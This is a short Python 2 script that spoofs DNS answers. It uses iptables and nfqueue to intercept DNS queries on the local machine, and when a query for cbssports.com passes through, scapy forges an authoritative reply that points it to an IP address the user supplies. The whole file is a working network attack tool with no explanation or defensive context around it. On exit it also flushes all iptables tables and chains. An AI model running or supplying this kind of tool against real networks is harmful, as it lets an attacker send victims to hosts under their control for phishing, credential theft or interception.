#!/usr/bin/env python

import nfqueue
from scapy.all import *
import os
domain = 'cbssports.com'
os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE')
global localIP

localIP = raw_input('Please input your IP address:\n')

def callback(payload):
	data = payload.get_data()
	pkt = IP(data)
	if not pkt.haslayer(DNSQR):
		payload.set_verdict(nfqueue.NF_ACCEPT)
	else:
		print pkt[DNS].qd.qname
		if domain in pkt[DNS].qd.qname:
			spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
					UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
					DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,\
					an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=localIP))
			payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(spoofed_pkt), len(spoofed_pkt))
			print '[+] Sent spoofed packet for %s' % domain
def main():
	q = nfqueue.queue()
	q.open()
	q.bind(socket.AF_INET)
	q.set_callback(callback)
	q.create_queue(0)
	try:
		q.try_run() # Main loop
	except KeyboardInterrupt:
		q.unbind(socket.AF_INET)
		q.close()
		os.system('iptables -F')
		os.system('iptables -X')
		os.system('iptables -t nat -F')
		os.system('iptables -t nat -X')
		sys.exit('losing...')
main()
